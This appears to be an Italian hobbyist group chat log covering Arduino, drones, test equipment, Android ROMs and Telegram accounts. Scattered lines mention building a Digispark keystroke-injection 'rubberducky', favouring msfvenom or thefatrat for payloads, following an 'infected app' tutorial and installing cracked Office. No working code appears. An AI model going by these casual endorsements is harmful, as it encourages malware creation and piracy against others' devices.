se hai usato una vpn sul pc windows e la mail si è sincronizzata potrebbe rilevare quell'"accesso" come un accesso dalla Russia e segnalartelo
Non ho una vpn
Ed è sincronizzata solo sul cellulare
Raga, chi sa usare after effects?
Come si chiamano questi componenti?
Credo condensatori ceramici
Ho fatto un antivirus,ma ancora lo devo compilare per i vecchi firmware
Mi pare minimo Android oreo
?
Non è spam, perché se lo avrei passato lo avrei dato qui, non voglio pubblicizzare nulla
Ah
(Naturalmente senza nessun collegamento[spam], o backdoor[va beh,che lo posseggo sul mio device])
(Scusatemi i termini mooolto sbagliati, ma volevo spiegare più easy possibile)
Ohibò, lei da quanto è qui?
Grazie
Cioreee
I DVD -r vanno bene per l'installazione di Windows
Niente risolto
Chi lo conosce?
 usando grooveip il numero per quanto rimane tuo?
Sempre
Sono entrato e ho trovato un account già usato 
Non scade come gli altri?
Eliminalo, poi contatta spam bot e digli che è un numero voip
Al decimo sclero lo sbloccano
No, ma solitamente sono numeri che vengono usati una volta per doppi account telegram/altro
? Io ho preso un numero a caso da groove e aveva già un account tg
Intendo, gli altri dopo tot giorni tolgono il numero e lo danno ad un altro
Eh, lo devi eliminare ma sarà limitato
Quindi devi scrivere a spambot e dirgli che è voip e non eri quello di prima
Se non mi sbaglio su groove ip non ci sono limiti di tempo
Che culo!
Uhm... Sarà
? 
Devi aspettare un po’ con i VoIP
Sei limitato...
Vai a capire cosa si fuma Telegram
Ma spambot dice di no
È normale
🤔
Con i VoIP devi aspettare un po’
3 giorni
Azz
Ma ci vogliono veramente 3 giorni?
O basta sollecitare lo spam bot?
Raga esiste un metodo per riunire tante unità (di memoria)
In una singola?
In che senso?
Tipo da 3 usb diventa 1 usb
Ok grazie,
Dopo leggo
fino a che continui a confermarlo (basta mandare un sms a un numero a caso ogni 30 giorni)
ah, se vuoi un consiglio, come faccio io, disinstalla pure l'app, tanto se imposti una password 2FA al tuo account telegram non possono più prendertelo anche se il mumero torna libero
Graciass
Sms in app o a pagamento?
in app
Lol
Altre app invece se ne fregavano e toglievano il numero comunque
A quanto è veloce il mio computer
A trasferire i file
In modo ironico
eccoli tutti col voip
Ma quanto è fiero il mio secondo account!
Mi perdoni, capo
ah non era un rimprovero 
pff, io da sempre
Veramente no 
Ah ok Volevo levarmi un po' di gruppi inutili dall'account principale
ma ma ma
questa è cattiveria
Questo gruppo non era compreso
Lel, ho installato Files Go sul cellulare di mia madre e si è riavviato.
raga come faccio a portare a condizioni iniziali un nodeMCU
Ragazzi per il progetto che vi avevo detto ieri avevo pensato ti 
A un app che ti diceva con dei personaggi animati come fastiriti
A seconda del tempo che c'è
*clippy*
Non capisco

Ma adesso openload ha ripreso a funzionare?
a me oggi andava (16/17 pm)
Okkk
Ma se mi morde un Mi Band, divento un Bandman????
Nanananananananana  BANDMAN

Mmmmmm ma sei sicuro che sia originale?
Si si tranquillo ahahah
Ma si può settare la schermata principale?
Al massimo è


Si
Nop, scrivilo in una console JavaScript
Ah
Ma PY ITFW
[] == 0 True
"" == 0 True
"" == [] False
lol
Stavo seriamente pensando di fare una maglietta sulla mano della giustizia
Vi immaginate andare in giro con questa xD
Questa sarebbe anche carina ma i tizi sono sicuro trademark

Oppure this
scusate ragazzi, avrei una domanda: prendere con uno script i sottotitoli da youtube è permesso da youtube?
Si, ma penso te li faccia anche downloadare in un file direttamente, in qualche modo
yup, se scarichi il video con jdownloader ti prende il file
ah menomale, grazie mille per la risposta!
ok ora sono più tranquillo
SkyFactory 2.5 E73, dovrebbe essere 4nov 2016 o i giorni successivi... se la trovi grazie perché gli sto facendo un montaggio ma quella mi manca
Ma che ca
.-.
E questa è stata la mia reaction al sito di 
 (
)
AHAHAHAH(grazie della pubblicità ma per il momento non ci guadagno nulla dalle visite sul sito) 
Hahaha
La terza è da 

simoneee
veniamo da teee
stessa cosa hahahahahahahhaha
Seeeh ahah

Proprio Bartolini deve spedirlo
ma che cos'è questa cosa
Cosa sciera in ghuel ghodice
🤷‍♂
Ma che porcata è?!
Ma poretto
Bello il video acab che se ne forte dell'allineamento xD
Ehm

cosa ti ha fatto Dio.......... ti da cosi tanto fastidio da bestemmiarlo?
era un obbligo
Sorry cicca
Ah 
thx mano 
Bella
MSI Z370 Pro Carbon
No, è davvero brutto, sembra che si è impegnato per farlo così brutto
Speriamo che il Mi 7 arrivi in Italia
E anche un tablet con penna non farebbe male... Buono, a buon prezzo, funzionante e con una penna funzionante. Almeno sarebbe contro iPad/surface.
il problema è che lo vendono dall'Italia ti tocca pagare tutte le tasse: iva dazi.....
Ma tanto sempre da Gearbest lo prenderò
Però se lo venderanno in Italia avrà la banda 20
 magari è un sito per "allenarsi"
Con i prezzi di Mediaworld🤦‍♂
Raga,eurotruck simulator 2 non deve laggare nel mio 
 purtroppo,il caricamento va mooolto lentamente,mentre il pc non lagga,ce la risoluzione bassa,la grafica bassa. Ma non aiuta che faccio? Voglio dirvi che prima non laggava nemmeno un po,anche quando usavo i mod
Raga perché quando installo kali  linux via usb  mi da un errore del cd  rom
devi installarlo via dvd
usa parrot comunque, kali fa schifo
Volevo provare
Grazie
Con che programma mi consigli di creare il DVD?
Letto cantando 
Appena compro altri 48TB di Hard disk lo uso

Bianchetto
un classico
Come l'overvault
Ragazzi ho un problema con il drone che ho costruito con le guide di marco
Cioè vola, peró vibra e all’improvviso cade
A voi mica è capitato?
No, a me non vibra....
L'ho finito però 
Cooosa  Stranissimo... Naza?
Si sì naza
All’improvviso inizia ad oscillare e crolla
Cosa puó essere?
Basta cliccare su Menu, Apri trascrizione
Pid, a occhio
Pid?
Si a me sembra di aver montato tutto dritto
il cappelletto del gps puntato verso avanti e anche la naza con la freccia verso avanti
il software ho controllato tante volte ed è tutto a posto
Anche le coordinate x y z del gps sono giuste
Gain anche

nel dubbio formatta
Ragazzi sapete che vuol dire l’errore exit status 1 ?
*gif veggente che scruta la sfera di cristallp*

No seriamente cosa devo fare ?
Dove? Cosa? Come?
Abilita I messaggi del compilatore
i download di tg sono p2p?
È messo su all
Mi da gli stessi messaggi di errore
No
Scarichi dai server di telegram
exit status 1 vuol sempre dire "hey, c'è un errore" senza specificare, mentre exit status 0 vuol sempre dire "terminato senza errori"
E come faccio a programmare il “digispark”?
Detto così non significa niente
Sarebbe arduino in miniatura, per costruire una rubberducky
Beh almeno sarai l'unico possessore al mondo di liquore polverizzato
Come mai libre Office lagga con un Pc da 1300€?
Perchè è ottimizzato con il culo
Meglio blocco note
Sul serio, i powerpoint vengono che è una meraviglia
perchè è "libre" == da poveri
PeRkÈ e LiBrE
Almeno non ci sono CRACK 100% PERCENT VIRUSFREE di libre office, a differenza di office 360
sappi che in questo esatto momento sto installando office 2016 crackato sul pc
perchè mi serviva aprire excel e mi sono accorto tipo 2 ore fa di non averlo
E hai 2200€ di macchina da gaming
Con antivirus
e il nome del video su iutub finisce con "+crack 100% funzionante"
haha, antivirus
sad
lol
Cos'hai detto
Ragazzi perché non mi riconosce il comando press in arduino
?
perchè la libreiria DigiKeyboard non ha la funzione press()
Usa questo
Perché usi Windows
GRAZIE MILLE ZIOOO
Perché libre Office è ottimizzato col culo
È Windows ottimizzato con il culo
Ragazzi
Tempo fa avevo istallato kali Linux su un Mac
Da virtual box
Ora l’ho installato nuovamente ma ha conservato la vecchia password che ovviamente non ricordo
Come faccio a cancellare i vecchi dati (installandolo nuovamente ho propio creato una nuova macchina)?
Ma non so come eliminare i vecchi dati...
Probabilmente hai scelto / il sistema ha preso lo stesso disco virtuale precedente... anche se mi fa strano.
Ti conviene fare rimuovi eliminando la macchina virtuale e tutti i suoi dati e poi reinstallare da capo la macchina virtuale tramite iso.
Ma ho fatto proprio questo
Ho eliminato la vecchia macchina
Della quale non avevo più l’iso
E poi ho installato l’iso di nuovo
Altra versione
E fatto il procedimento da capo
Arriva il Linux fanboy
È semplicemente un dato di fatto
Linux è ottimizzato bene, che a momenti non ha manco i driver?
Mi stai dicendo che esistono i driver su Linux?
Nel 1990 aveva pochi driver, adesso molti driver della gpu vanno più veloci che quelli su Windows
I legacy
Cavolo! Aspetta che lo installo allora! Con full AMD come va?
AMD è quello più supportato
AMD rilascia tutto open
Anche su mac la cartella delle VM's dovrebbe essere quella utente, teoricamente su "~
 Box VM's" li dentro trovi una cartella con il nome della tua macchina virtuale su vBox, prima la elimini sul programma e poi cancelli a mano la cartella definitivamenet così sei sicuro di aver rimosso tutto
Ci sono benchmark dove le gpu amd su linux schizzano avanti allo stesso modello su Windows
Infatti, peccato che AMD la usano tecnicamente 4 gatti da secoli (è tornata in auge adesso)
Driver Legacy vs Driver "proprietari"
Che sono la stessa cosa
Forse volevi dire
Open VS Proprietari
Amd ha solo open, quindi non c'è problema di confronti
Yes, errore mio
 vi prego andate a 6:58 minuti, io la metto come suoneria
Ahahahahah
Hei
Alabek sempre online
Ahaha
Aahabahhahahahahahahhahahahaha
Anassshtasssio voltah
pure a me tipo la batteria caricandola il caricatore rimane la luce sempre rossa, credo sia una cosa della batteria più che altro
Che strano...
già
Magari 
 lo sa
Mi sa hai ammazzato la batteria

Ragazzi, confermo che telegram sospende l’account se carichi troppi file...
Cioè?
Per quanto tempo?
Magari è solo perché li hai caricati insieme
Prevedibile
why?
Ho caricato 80TB in una settimana
beh giusto l'altro giorno ho caricato, per testare, una iso di raspbian desktop su telegram, in un gruppo per dire
Ah
beh te stai male
Avevi 80tb?
Di cosa?
Backup di alcuni canali yt
Ah
E madonna
appunto, oltre al "con quale connessione", ma dove li trovi 80TiB di robba
Con il doppino telefonico non carico nemmeno un gigabyte al mese
Scaricati da YouTube

ma fatto apposta per testare l'hai fatto, vero?
Volevo usarlo come cloud ma non sono stupidi... fortuna che ho il NAS
no perchè altrimenti mi suicido

io credo che per le prossime ore inizierò a guardare rick e morty facendo finta che tutte le verifiche che la settimana prossima mi fotteranno senza vasellina non esistano
Io entro giovedì, ed ho una gita :D
Magari potevi caricarli a tratti
io la gita la inizio il 7, si scende in calabria
Io vado al Vajont, che palle
ssieeeeeed
Stavo studiando un modo di sfruttare Youtube come cloud illimitato, anche se è abbastanza malata come cosa
che gruppo? 

Io comunque ho caricato circa 90GB e non mi è successo niente  

ma perchè sfruttare Telegram così 
Pickle Rick!
Il 21/06 daró l'esame comptia security + per cui devo prepararmi come pochi.... Qualcuno ha una flebo iniettabile di cyber security?
Omg, sei un genio 
Potresti caricare dei video che contengono file all'interno...
e poi ci sono io che sono 36 ore al giorno su FL Studio
(non è vero, ho tipo 1 ora libera se sono fortunato ma dettagli)
gli articoli del blog 
Vabbè puoi farlo tu... O con msfvenom oppure con thefatrat ... Che è poi il mio preferito
sono passati 3 secondi dal primo episodio e già vedo uno che guida un disco volante con una bottiglia di vodka in mano...già lo amo
Ahahahah io invece sto fisso con logic pro
Perché è gratis :D
No per quello ritaglio tempo... A costo di non dormir la notte
Quello che pensavo di fare con yt

Codifichi i file in immagini e ogni video è una sequenza di file quindi (una cartella)
e 2 secondi dopo si parla di sterminare l'umanità, aaaaaa, ci si vede domani
La adori quella serie 
 devi passarmi Poison vs. Wizard in lossless tipo now.
ma ❤️❤️
arriva, flac?
yesss
2 anni che si carica...
rick & morty è una serie geniale. La sto giusto riguardando in questi giorni

vedo cose
Le indecisioni delle 22:14
Petrarca
Senza dubbio
ma c'è un update di Switchando che sarebbe dovuto uscire un mese fa
ho capito, nel dubbio apro csgo
Appunto, può uscie domani
non uscirà prima di un altro mese, vai tra
devo prima risolvere con la mia prof di italiano
Lascialo stare Petrarca
si è fermata tipo 4 mesi col programma e mo sta correndo manco Raikkonen
Grande Francè
pls
Studia
ma io mi chiedo
è possibile che l'indirizzo della mia scuola è "elettronica ed elettrotecnica" e l'unica cosa che studio a casa è letteratura?
non tocco un libro di una materia diversa da letteratura da... Settembre.
Per forza: delle cose elettroniche sai già tutto
Il laureato petrarca
bro è che di elettronica sta da natale a spiegare il decoder per il display a 7 segmenti
di TPSEE abbiamo un prof che non sa manco di essere un prof a quanto pare
e di matematica mi basta seguire in classe
Letteratura è una rottura di coglioni
poi se TPSEE = chiedere consigli su che giochi della play comprare al figlio mi sbaglio io allora, è bravissimo lui
Io invece faccio la terza media e devo sopportare la prof di scienze che dice le peggio cazzate sull'elettronica
correggila
oggi ho provato a correggere il prof di laboratorio ma niente
chiama gli invertitori deviatori, e i deviatori commutatori
marco sei nella mia stessa situazione: 5 anni di itis elettronica e io ho sempre e solo studiato letteratura, storia e inglese. Il resto non ho mai fatto ne compiti ne aperto i libri (che sono stati a malapena tolti dal celofan)
ahahahahahah una volta ha fatto spiegare a me 
ha detto dato che sai tutto spiega te
🤦‍♂
...🤦‍♂️
io manco inglese, tanto siamo a livelli PET mentre io mi sto preparando al First Certificate, e storia veramente poco, di solito leggo sul libro mentre mi interroga
io con inglese purtroppo ho sempre avuto problemi, e la prof che avevo era pure parecchio stronza
devo dire che quest'anno la mia prof d'inglese è brava, almeno per quanto concerne la sua materia
La nostra oltre a minacciarci di denuncia non fa
wtf
che gli fate 
peggio della mia prof di storia che ci prega di menarci all'ora dopo
"ci vado di mezzo io ragazzi, capito?!"
(ogni tanto partono le peggio risse nella sua ora, solitamente per scherzare ma capita che sono serie)
ahahahahah
a noi invece nell'ora di inglese tirano la roba dalla finestra
Nulla, la contraddici e ci dice che ci denuncia, ogni volta che ci fa usare i telefoni per vedere i compiti ci dice di non fare foto o scatta la denuncia, per ogni cazzata
hanno trovato di tutto la sotto
vuoi una foto di quello che vedo guardando giù dalla finestra?
No perché il cestino in classe è sempre vuoto per farti capire
hanno trovato cartelline, libri, quaderni, 3 cancellini ed una sedia
ah dimenticavo il flauto
Ah ahahahah
anche alcuni miei insegnanti dicevano "per piacere, menatevi alla fine della scuola, non durante le lezioni"
io ci ho trovato un paio di giacchetti miei, il mio zaino, il mio astuccio e un banco l'anno scorso.
Ahahahahah si sono messi d'impegno
una volta a noi l'ha fatto il prof
dato che sotto la finestra sta un giardino ha buttato la mela
Il delirio per quella mela
la cosa più strana che abbiamo trovato la sotto era un pacco di scaldatelli
Poi ci siamo noi che siamo entrati alle 9 del mattino in classe col pesce fritto
AHAHAHAHAHAHAH
Bhe noi abbiamo fatto la pasta al sugo in classe

Eh, c'era il mercato
Raga help ho rotto il cell e sono costretto ad usare un iPhone ..... kill me pls
Madò la tortura
io proprio gli iphone non li concepisco
e fai conto che il pomeriggio gioco a Fortnite con quello che l'anno scorso mi aveva buttato giù l'astuccio e due anni fa mi aveva lanciato il cellulare in corridoio tipo pallone da calcio
poi mi vengono pure a dire che non so perdonare io 

Una cosa buona la ha: è tutto omogeneo
ma gli scaldatelli dalla finestra sono un tocco di classe
Le ui si assomigliano tutte
shalla, basta che funziona
si la grafica è bellina ma per le mie esigenze proprio no 
ovvio, se non rispetti le linee guida di Apple sei fuori dall'App Store
mica ci posso ficcare dentro nethunter
Che puttanata
ha anche il suo lato positivo
a proposito di telefoni, sto pensando sempre di più di cambiare il mio S6, pensavo di aspettare il Mi 7, che dite?
E' una gran cosa invece
Su android è un casino
Ogni app con la sua grafica. Hanno inventato il Material Design apposta ma a quanto pare anche Google sta cominciando a non rispettarlo
bah io sto bene col mio j3 2016
più che altro iphone è buono da certi punti di vista, nel senso che ti ci abbitui in fretta ed è semplice, appena ti abitui al tastone lo usi senza problemi, però se c'hai voglia di usarlo come un android fai prima a prenderti un android
J3 2016 > S6
No, anche perchè Apple è usata molto, oltre che da ragazzini, anche da un sacco di gente che usa il telefono per lavoro. A sta gente serve immediatezza, quindi si imparano un minimo la UI e la ritrovano cosi dappertutto e son comodi
costa poco e non rompe le palle quando si tratta di flashare custom rom
poi per quel che riguarda alla grafica ci sta, c'è la cosa bruttissima del non poter mettere dove caxx vuoi le icone nella home ma vabè, almeno è tutto bello pulito
L'S6 ha una batteria che dura meno di due ore e nei momenti più caldi della giornata non si può tenere in mano
non come il mio vecchio gradn prime
Comunque non è prioprio vero che su iOS tutte le app rispettano le linee guida, quelle Google ad esempio sono pseudo material design
esaaaatto
ma che cos, Samsung ha i driver closed source... Come fanno a esistere le custom ROM buone...
Io ho rimesso la stock da un po'
a me funziona
poi non so voi coem ve la passate
però salto dalla custom alla stock
a funzionare vanno, ma avendo tutti i driver closed le uniche cose che si possono customizzare sono kernel e app installate... Deve essere sempre basata sulla stock, ergo TouchWiz
ad esempio in questo momento ho la stock
in questo momento ho una stock non pulita
con la twrp ho il backup della custom sull'SD che posso ripristinare in qualsiasi momento
come fosse freezata
e poi ritorno alla cstock
nel senso che è full stock senza root, ma avendo Knox trippato le app di Samsung non si aprono perché dicono che ho rootato il telefono
pure io
rootata
nono la mia è full stock senza root
con xposed
ma Knox non è su 0x0
ah ok
vabbe lo knox io non l'ho mai avuto 0x0
con la stock per forza
pure io, mi da alquanto fastidio
per risolvere basta rootare di nuovo e modificare una stringa nel build.prop
ma non mi va
dato che la garanzia era breve ho fatto la prova che tutto funzionasse ed ho subito rootato e installato custom recovery
come mai?
nel senso che ho subito fatto cazzate
non c'ho voglia di rimettere la TWRP
appena preso
a ecco
io l'avevo fatto, mi era rimasto come a te ora, dopo 5 mesi mi sono deciso e ho rifatto tutto e dopo altri 2 mesi ora mi ritrovo come te di nuovo
io senza twrp non posso stare perchè se faccio casini ho un bacup a settimana
ad esempio l'ultimo fatto 2 giorni fa
elimino i precedenti e rifaccio
ma fai conto che io me lo tengo così finché non inizia a laggare, poi faccio il formattone e provo qualche ROM diversa di solito
e ora volevo più che altro trovarmi una rom bellina, non mi interessa più che molto il touchwiz perchè mi piace come stile se per quello

mmhhh.. ci sta, tu che rom conosci di belle? (io ho un s7 ma bene o male quelle che stanno per s6 le fanno anche per s7 da quel che vedo)
la stock
è la pià bella
anche perché S7 ha la stock con Oreo
apposct
eh, non ancora
sì
è stata rilasciata in alcuni paesi
in teoria a maggio esce
per s7, ho guardato prima, la data di rilascio dovrebbe aggirarsi per fine maggio
Appena controllato, e secondo Sammobile è il 18 maggio
e Sammobile è la milgior fonte di rumor per Samsung
per s6 forse uscirà verso l'anno prossimo, ma ancora non se ne sa molto
sattoh
del tipo che per s6 si erano perse le speranze e poi qualcuno se ne è uscito dicendo che è in lavorazione
bro
per S6 non uscirà mai
il supporto per S6 è terminato
già, non ci si spera
Samsung l'ha scritto pubblicamente
che S6 non riceverà più aggiornamenti, solo quelli straordinari (ovvero le patch alle falle più gravi)
a ok, sad
comunque in che paesi è uscito oreo su s7 che me lo metto
e io che sto alla 5.1.1
che telefono?
che povertà
j3 2016
wtf
non ha Nougat?
beh per quel che mi riguarda marshmallow è meglio di nougat, lollipop non mi piaceva più che tanto invece
no
Dovrebbe aver ricevuto Nougat prima del J3 2017
edit: confermato che ha Nougat, almeno così dice un tizio su YouTube
Nel giro di qualche giorno i possessori di un Samsung Galaxy J3 (2016) brandizzato da AT&T dovrebbero poter installare Android 7.1.1 Nougat con le patch di sicurezza di agosto
maa, prova a dare un'occhiata con SamFirm no?
bah proviamo
meglio sammobile
è più aggiornato
io ho semrpe usato sammobile
mi passi il modello preciso del tuo telefono?
tipo SM-JXXXX
sm-j320f
ok si, 5.1.1
e niente, secondo Sammobile è fermo a Lollipop
pure secondo samfirm, che saaaad
certo che Samsung ha politiche di merda per gli aggiornamenti
eh io infatti lo cerco da un po' l'update ma...
seriamente
il bello è che Nougat su S6 è Marshmallow con il core di Android (o come volete chiamarlo) aggiornato
per il resto è la TouchWiz di Marshmallow
mentre su S7 Nougat ha la nuova Samsung Experience invece della TouchWiz
No
Stessa cosa con S5, Marshmallow su S5 è uguale a Lollipop
Ha ancora touchwiz
fidati
conosco gente con l'S7
S8 ha la Samsung experience
e comunque Nougat su S7 ha praticamente tutto quello che ha S8
Su S6 non si sono manco degnati di aggiornare device manager col nuovo risparmio energetico
no non ha touchwiz, confermo
Io mi ricordavo differenze tra la ui di s7 e s8
poco poco manco l'os intero
al massimo il launcher
ma non penso, penso abbiano aggiornato anche quello
comunque notte a tutti
su S7 si scorre verso l'alto o c'è il pulsante per aprire il drawer?
Per farvi capire, questo è quello vecchio (S6)
c'è il pulsante
ma io sono felice, lo scorrere verso l'alto mi fa sanguinare dagli occhi
rip, non hanno aggiornato il launcher
si può impostare anche il pulsante col nuovo launcher
si, in teoria da qualche parte si può togliere l'app drawer
ma solo io ho attivato l'ascolto del microfono in tempo reale dalle cuffie per sentire il suono della tastiera?
che cosa brutta
ma
non puoi dire che non è rilassantissimo
maa, tipo togliersi direttamente le cuffie?
starei sentendo Garrix
ma ma ma, come fai a sentire musica con in sottofondo la tastiera, da fastidio
macché fastidio
c'è, è come stare a giocare in playback e avere metà del volume del gioco che rompe le scatole e non capisci più se vuoi sentire il playback o il gioco
ma che c'entra
È lo stesso fastidio ù-ù
Ah
Ragazzi per riprogrammare un sonoff basta collegarlo al programmatore e collegarlo al PC tenendo premuto il pulsante, vero? Poi impostando l'ide di Arduino con i giusti parametri si può caricare il programma (per l'ESP logicamente).. ho seguito una guida online che diceva di fare così ma dopo la prima prova che ha funzionato alla grande il sonoff non da segni di vita, non so perché
Posso porre l'attenzione su un video?
?
Qualcuno bravo in calcio scommesse? Haha scusate l’OT
Esiste la bravura?
non so quanta bravura ci voglia a buttare i propri soldi
Consigli!!
Appunto
l'unico consiglio è quello di farti notare che, anche se dovessi vincere qualche giocata particolare, alla fine dei conti sarai sempre in rosso a causa di tutte le giocate andate male
Consiglio #1:
Il gioco d'azzardo è la cosa più inutile del mondo
^
Non se sei tu a organizzarlo
Troppo disturbante questo Bug
Perenne notifica?
Yup
pff, te non sai nell'app degli autobus qua, nei caricamenti c'è l'animazione della particella che ruota attorno a un asse a mo' di circonferenza che interseca i bottoni, c'è, già che è piccola, proprio sopra i bottoni la dovevano mettere
Probabilmente c'è un audio che non hai ascoltato
Ahahahahah
cos
Ragazzi una domanda....questi due Gimbal sono compatibili con la naza lite con upgrade a v2?
Quindi con pmu della lite
ma che brava mano
woow
l'hai fatto allora?
Vi consiglio la versione di questo però digitale
È fantastico
infatti si, è una figata
Da mo
ah
Ho acquistato moltissime cose tacklife e sono tutte molto buone
per quello dicevo a 
?
Ma quanto è palloso renderizzare lossless in wav 
Di togliere il reffatore dalla todo
ma sapete come far aprire un link esterno dalla tastiera inline del bot?
Nope
sei nel gruppo sbagliato allora hahaahahh
Eh
quante ore...
bello
ci metto meno a renderizzare il video che la canzone, fai tu  colpa di Spotify che vuole i .wav e non i .flac
ssiieeeeeeeed
quanto ti viene a pesare il .flac?
c'è, con quale connessione lo carichi poi
Ragazzi come posso dire ad app i censori che un a volta visualizzata un a pagina di non aprirla piu
60 mega
col 4G 
beh dai, pensavo almeno 100
quando hai l'abbonamento con il 4G e il wifi e allora usi il 4G solo quando serve
TinyDB
Cosa Emanuele lillo
Oppure una variabile, se non ha la necessità di fare ciò, anche quando l'applicazione viene chiusa è riaperta.
Ahahaahahaha manooo
Ragazzi perché quando eseguo questo programma non mi mette “shutdown -s -t 0001” ma mi esegue “shutdown ‘s ‘t 0001” ??? Pls aiutatemi
Qualcuno sa che sensore e
 fatti spedire la RunCam 3 da Banggood e recensiscila
Termistore probabilmente
Ok grazie
Ragazzi
Non mi bannate vero per questo? E che temo per quello lol
Nel Video di oggi hai seguito il consiglio di Nicolò proposto durante la chiamata mensile dedicata ai Patroni.
Essere Patrion da i suoi frutti!!!
forse era meglio non cambiare nome 
Io proporrei di riscrivere group help bot
E integrare tutto in un solo bot 
AH 
comunque per riscrivere GH si può fare, io ci stavo provando l'estate scorsa
poi ho lasciato stare perchè è un attimo impossibile
Perché?
Ha solo 2 terminarli... potrebbe essere qualcosa di ottico o di temperatura...
Per favore aiutatemi 
Nah
a parte che si potrebbero togliere un sacco di robe che non ci interessano, visto che lo usiamo solo noi
Modifica il benvenuto
È troppo maschilista
Appunto
Non è così impossibile
Io ho riscritto una parte, e funziona bene... Non ci ho perso neanche troppo
Mi spiegate come funziona un fablab?
Ho trovato su banggood un kit con 37 sensori per arduino 9 euro dalla cina o 12 dall'europa. A livello di tempistica quale mi consigliate?
Europa
Lo chiedi anche?
?  tze, che sono quei cosi..inchinatevi al RE dei tester 
digitale invece questo
?
Mi consigliate un oscilloscopio? max 120€
usato ovviamente..nuovo è impossibile
avevo visto il DSO203..... cosa ne pensi?
lascia stare, è un giocattolo quel coso..ti serve per prove da banco?
da usare con i circuiti  di arduino
io onestamente proverei a prendere questo all'asta
?
oppure questo
?
se ti serve portatile invece questo
?
Spe Corrado che ti mando quelli che abbiamo all'università nei laboratori didattici
ok
Se vuoi ti do il contatto di un ragazzo che lo ha
Si trova benissimo
è facile da usare ma è parecchio impreciso quel cosino
100 volte meglio un buon oscilloscopio da banco
Grazie mille...... è  un dilemma. Spiegatemi la differenza tra uno a 2 canali e uno a 4 o più cansli
Certo, non si può comparare con uno classico però per quel che costa
Io ho comprato un dso150 xD
in parole povere, le forme d'onda che puoi misurare e visualizzare su schermo..2 canali, 2 forme d'onda, 4 canali, 4 forme d'onda
quello che sembra un Ipod
Non è male però
🤣🤣🤣
Fino a che frequenza arriva
Io l'ho preso per portarlo in giro
Perché il Keysight è fisso
Controllo
Questo qui
bella bestiolina
Già già!
In giro ce ne sono anche alcuni a 4 canali, ma quelli sui nostri banconi sono solo a due
io uso Rigol e HP come oscilloscopi, ICE e Fluke come multimetri,  CEM per multimetro-oscilloscopio portatile
Ok sono confuso
Bzzbzzbzzz Huston abbiamo un problema bzzbbbbzzzzbzbz
? il cucciolotto del laboratorio ❤️
1000 carte
è da laboratorio anzi è anche economico, esistono Rigol anche di 2500-3000€
questo invece è il mio oscilloscopio e multimetro portatile, un CEM
?
quasi come quello da laboratorio
figo
 devi vedere ancora multimetro digitale e pinza amperometrica
?
eccoli qui
A me non piacciono molto quelli 2 in 1
Troppo piccoli
il CEM intendi? eh lo so, ma io sono obbligato a portarlo nello zaino..in montagna oppure sui tralicci non posso portarmi appresso il Rigol
Invece come tester analogico ho il mitico ICE 680R
?
tutta roba professionale..per non parlare poi della borsa dei ferri..tutto Intercable, Usag, Wurth e Wiha
oltre 1000€ di attrezzi
Come forbici e spellafili invece uso Intercable, Usag e Cembre
Beh si, per lavoro conviene sempre usare cose professionali
Secondo voi parte
Per hobby dipende
Che problema ha?
No perché è regalata
A 420 euro si dai
Io ne ho trovata una a 1750... Modificata però
È 50 mica tanto regalata
Cioè molto bassa si
È del 2005
I 50 regalano emozioni!
Però è un prezzo che (raramente) si trova
Io uso ancora il gpr
Soprattutto i 2 tempo
Le 600 molto di piu
Ah
Allora si abbastanza
Mai provata una 600
Solo la 1000
Ah beh
io lavoro su tralicci, trasformatori di potenza, quadri elettrici, ponti radio..roba grossa, si deve usare attrezzatura professionale e sicura altrimenti ci rimani attaccato
Meglio la 1000 forse 
Mai provata una 1000
È assurda.
ma la vera domanda è: come diavolo fai a tenere il telefono sul naso?
È fil! Uno squilibrato genovese
Youtuber
si nota
Io faccio di peggio
Non trovo la foto... Comunque avevo attaccato una reflex sul casco per fare una ripresa 
pazzo..ti rompi il collo con quel peso
Avrò schiacciato qualche vertebra 
Che poi, ci ho messo un oretta e neanche era buona...
 esperimenti pazzi

Lo rifarei però
Raga sto seguendo il tutorial di overvolt per l' app infetta
E mo mi da questo
Chi aveva preso Google home mini? In ogni caso...come si trova?
Un FX e grigli pure la piastra in ardesia della griglia stessa
Lol
Marco col video sul laser mi hai fatto venire in mente un'idea per un gioco per la gatta
 
porcoddue se è potente quel laser
devo per forza mettergli un Arduino col PWM o la cieco la gatta

Credete che vada bene alimentare un laser i PWM ?
Un led è una giunzione in silicio.
Un laser ha a bordo anche un circuito di regolazione integrato.
Non credo gradisca un alimentazione pwm.
Alimentandolo comunque a 4 4.5 V la potenza è più bassa e il circuito di regolazione non si incazza, meglio sarebbe alimentarlo con 1 o 2 diodi in serie, che creano una caduta di tensione di 0,6 cadauno.
d3d11.dll caused an Access Violation (0xc0000005)
  in module d3d11.dll at 0023:6e3065ba.
Questo errore a cosa è dovuto?
Mi perseguita quando cerco di avviare giochi in 3d e penso sia dovuto al fatto che ho una scheda video troppo poco potente ossia una Intel Core Graphics Accelerator HD (integrata)
funziona benissimo
devo solo aggiungere un potenziometro per regolare la luminosità, un pulsantino on-off e via
Quindi vai di PWM?
Non ho capito
Chi se ne intende di retrogiochi?
Non ho idea di chi debba essere A, B, C, X, Y, Z, cosevarie
Venerdi scorso ho giocato a Moon lander e Nim su Olivetti Programma 101, ma credo sia troppo retrogaming...
Ma il video per fare un google home mini e un google home quando esce?
Ma sopratutto si basa sul raspberry?


Interessante topic... Magari non risolve l'ho trovato un po' velocemente...
zizi
Quando mi arriva la roba
Sia home che home mini?
HELP, sono ancora ignorante in materia, il famoso BLink con qualche modifica, ora vorrei capire come accendere il LED digitando sul terminale ON, OFF, LAMP. Mi dite come si fa?
sta benedetta variabile char come funge?
Char indica un carattere
ok io voglio scrivere ON e farlo accendere, quindi dovrei creare un array?
Dai un’occhiata alle stringhe in C, si usano i puntatori
provo
grazie
quando le pubblicità prendono il possesso del sito
Scusate, come faccio a dividere un operazione fra due raspberry?
Computazione Parallela? MPI
Cioé?
È un software che ti permette di eseguire script in C, Fortran e Python in parallelo su più dispositivi per creare un cluster
Java?
Ho trovato questo

 Potrebbe essere il prossimo argomento per la page
Me lo scrivo, grazie :)
Di niente
Certo
Here it is
E con quel pulsante posso sia accenderlo e spegnerlo che settare il duty cycle (cambiare la luminosità)
Page?
Potresti fare un sistema di specchi con due servo, cosi puoi farlo diventare automatico
nah tanto lo userò più come puntatore laser illegale da avere sempre nello zaino
Lol
anche perché a quanto pare per la gatta è troppo luminoso
ha sempre giocato coi puntatori che vendono i negozi cinesi ma con questo si è spaventata dopo 5 minuti e al momento non vuole più vederlo
Ahahaajaj
Piccola
Io al mio cane volevo comprare un robot aspirapolvere cinese da pochi euri
Così gioca quando è da solo
